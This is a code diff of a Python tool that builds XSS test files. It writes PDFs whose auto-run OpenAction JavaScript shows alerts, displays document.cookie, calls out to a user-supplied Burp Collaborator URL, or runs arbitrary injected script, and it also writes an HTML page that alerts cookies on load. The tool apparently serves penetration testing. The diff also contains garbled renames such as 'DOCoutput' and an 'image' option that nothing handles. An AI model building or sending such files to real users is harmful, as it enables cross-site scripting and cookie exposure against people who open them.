@@ -1,7 +1,8 @@
 import argparse
 import sys
+
 if sys.version_info[0] < 3:
-    raise SystemExit("Use Python 3 (or higher) only")    
+    raise SystemExit("Use Python 3 (or higher) only")
 
 def create_malpdf1(filename):
     with open(filename, "w") as file:
@@ -9,8 +10,10 @@ def create_malpdf1(filename):
         1 0 obj
         <</Pages 1 0 R /OpenAction 2 0 R>>
         2 0 obj
-        <</S /JavaScript /JS (app.alert(1))
-        )>> trailer <</Root 1 0 R>>''')
+        <</S /JavaScript /JS (app.alert(1))>> 
+        trailer
+        <</Root 1 0 R>>''')
+        print("[+] Created xssPDF-1.pdf")
 
 def create_malpdf2(filename):
     with open(filename, "w") as file:
@@ -18,94 +21,114 @@ def create_malpdf2(filename):
         1 0 obj
         <</Pages 1 0 R /OpenAction 2 0 R>>
         2 0 obj
-        <</S /JavaScript /JS (app.alert(document.cookie))
-        )>> trailer <</Root 1 0 R>>''')
+        <</S /JavaScript /JS (app.alert(document.cookie))>> 
+        trailer
+        <</Root 1 0 R>>''')
+        print("[+] Created xssPDF-2.pdf")
 
-def create_malpdf3(filename):
+
+def create_malpdf3(filename, url):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(f'''%PDF-1.7
         1 0 obj
         <</Pages 1 0 R /OpenAction 2 0 R>>
         2 0 obj
         <</S /JavaScript /JS (
-            app.alert(1);
-            $.ajax({
-                type: "GET",
-                url: "", //TODO: BURP COLLAB URL 
-                success: function(data){
-                    app.alert("OK");
-                },
-                error: function(xhr, status, error) {
-                    app.alert("Error: " + status);
-                }
-            });
-            app.alert(2);
-        )>> trailer <</Root 1 0 R>>''')
+        app.alert(1);
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "{url}", true);
+        xhr.onreadystatechange = function() {{
+            if (xhr.readyState == 4 && xhr.status == 200) {{
+                app.alert("OK");
+            }} else if (xhr.readyState == 4) {{
+                app.alert("Error: " + xhr.status);
+            }}
+        }};
+        xhr.send();
+        app.alert(2);
+        )>> 
+        trailer
+        <</Root 1 0 R>>''')
+        print("[+] Created xssPDF-3.pdf")
 
-def create_malpdf_input(filename, cin):
+
+def create_malpdf_input(filename, script):
     with open(filename, "w") as file:
-        print("hello")
-        file.write('''%PDF-1.7
+        file.write(f'''%PDF-1.7
         1 0 obj
         <</Pages 1 0 R /OpenAction 2 0 R>>
         2 0 obj
-        <</S /JavaScript /JS ('''+cin+'''
-        )>> trailer <</Root 1 0 R>>''')
+        <</S /JavaScript /JS ({script}
+        )>> 
+        trailer
+        <</Root 1 0 R>>''')
+        print("[+] Created xssPDF-sc.pdf")
+
+                
+def create_malhtml(filename):
+    html_content = '''<!DOCoutput html>
+    <html>
+    <head>
+        <title>XSS Test</title>
+        <script output="text/javascript">
+            function showAlerts() {
+                alert(1);
+                alert(document.cookie);
+            }
+        </script>
+    </head>
+    <body onload="showAlerts()">
+        <h1>XSS Test</h1>
+        <p>This page runs two alerts: one with the number 1 and another with the document's cookies.</p>
+    </body>
+    </html>'''
+    with open(filename, "w") as file:
+        file.write(html_content)
+    print("[+] Created xssHTML-1.html")
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser( 
-    description="Create Malicous PDF Files Leading to XSS Exploit")
+    parser = argparse.ArgumentParser(
+        description="Create Malicious PDF Files Leading to XSS Exploit")
 
     parser.add_argument(
         '-u', action="store", default=None, dest='url',
-        help="Specify the Burp Collaborator URL (e.g., http://n1pze4owqnry5tzzqngb5.oastify.com)")
+        help="Specify the Burp Collaborator URL (e.g., http://burpsuite12345.com)")
     parser.add_argument(
-        '-o', action="store", default=1, dest='option', type=int,
-        help="Specify the create PDF option (e.g., 1)")
+        '-o', action="store", default="pdf", dest='output',
+        help="Specify the file output (e.g., pdf, image or html))")
     parser.add_argument(
-        '-sc', action="store", default=None, dest='script',
-        help="Specify your own Javascript code (e.g., app.alert(1))")
-
-    if len(sys.argv) <= 1:
-        parser.print_help()
-        print()
-        sys.exit()
+        '-s', action="store", default=None, dest='script',
+        help="Specify your own JavaScript code (e.g., app.alert(1))")
 
     args = parser.parse_args()
-    option = 1
-    burp = 0
-    urls = {}
-    script = ""
+    output = args.output
+    url = args.url
+    script = args.script
+    output = output.lower()
 
-    if args.option == 1:
-        if args.url:
-            if 'http://' in args.url or 'https://' in args.url:
-                proxies = {"http": args.url, "https": args.url}
-                burp = 1
-            else:
-                print(f"You have specified an invalid url: {args.url}")
-                print("Don't forget to include the schema (http|https)")
-                exit(1)
-
-    elif args.option == 2:
-        if args.script:
-            script = args.script
-        else: 
-            print(f"You have specified an invalid script: {args.script}")
-            print("For option 2 use the -sc command")
-            exit(1)
-        option = 2
-
-    print("[+] Creating PDF files..")
-    try: 
-        if option == 1: 
+    if output not in ["pdf", "image", "html"]:
+        print("Invalid output. Must be pdf, image or html file output")
+        parser.print_help()
+        sys.exit(1)
+    try:
+        if output == "pdf":
+            print("[+] Creating PDF files...")
             create_malpdf1("xssPDF-1.pdf")
             create_malpdf2("xssPDF-2.pdf")
-            if burp == 1:
-                create_malpdf3("xssPDF-3.pdf")
-        elif option == 2:
-            create_malpdf_input("xssPDF-my.pdf", script)
-        print("[-] Done!")
-    except: 
-        print("Failed to create, must enter integer value 1 or 2...")
+            if url:
+                if 'http://' in url or 'https://' in url:
+                    create_malpdf3("xssPDF-3.pdf", url)
+                else:
+                    print(f"You have specified an invalid URL: {url}")
+                    print("Don't forget to include the schema (http|https)")
+                    sys.exit(1)
+            if script:
+                create_malpdf_input("xssPDF-sc.pdf", script)
+            print("[-] Done!")
+        elif output == "html":
+            create_malhtml("xssHTML-1.html")
+
+    except Exception as e:
+        print(f"Failed to create PDF files. Error: {e}")
+        sys.exit(1)
